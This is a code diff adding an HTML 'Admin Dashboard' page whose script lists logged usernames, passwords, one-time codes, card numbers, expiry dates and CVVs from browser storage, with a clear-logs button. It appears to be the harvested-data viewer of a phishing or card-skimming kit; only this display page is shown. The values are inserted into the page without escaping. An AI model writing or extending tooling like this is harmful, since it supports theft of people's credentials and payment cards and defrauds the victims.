@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin</title>
+
+    <style>
+        body {font-family: Arial, sans-serif;}
+        #logs {margin-top: 20px;}
+        .entry {
+            border: 1px solid #ccc;
+            padding: 10px;
+            margin-bottom: 10px;
+            background: #f9f9f9;
+        }
+
+        button {
+            padding: 8px 15px;
+            background: red;
+            border: none;
+            color: white;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background: darkred;
+        }
+    </style>
+
+</head>
+<body>
+    <h2>Admin Dashboard</h2>
+    <button id="clearBtn">Clear Logs</button>
+    <div id="logs"></div>
+    
+    <script>
+        function loadLogs() {
+          const logs = JSON.parse(localStorage.getItem("logs")) || [];
+          const logsDiv = document.getElementById('logs');
+          logsDiv.innerHTML = "";
+      
+          if (logs.length > 0) {
+            logs.forEach((entry, index) => {
+              const div = document.createElement('div');
+              div.className = 'entry';
+              div.innerHTML =
+                `#${index + 1}<br>` +
+                (entry.username ? `Username: ${entry.username}<br>` : "") +
+                (entry.password ? `Password: ${entry.password}<br>` : "") +
+                (entry.otp ? `OTP: ${entry.otp}<br>` : "") +
+                (entry.ccName ? `Card Name: ${entry.ccName}<br>` : "") +
+                (entry.ccNumber ? `Card Number: ${entry.ccNumber}<br>` : "") +
+                (entry.ccExp ? `Expiry: ${entry.ccExp}<br>` : "") +
+                (entry.ccCvv ? `CVV: ${entry.ccCvv}<br>` : "") +
+                `Time: ${entry.time}<br><hr>`;
+              logsDiv.appendChild(div);
+            });
+            
+          } else {
+            logsDiv.innerText = "No logs found.";
+          }
+        }
+      
+        loadLogs();
+      
+        const clearBtn = document.getElementById('clearBtn');
+        if (clearBtn) {
+          clearBtn.addEventListener('click', () => {
+            if (confirm('Are you sure you want to clear all logs?')) {
+              localStorage.removeItem('logs');
+              loadLogs();
+            }
+          });
+        }
+      </script>
+      
+</body>
+</html>
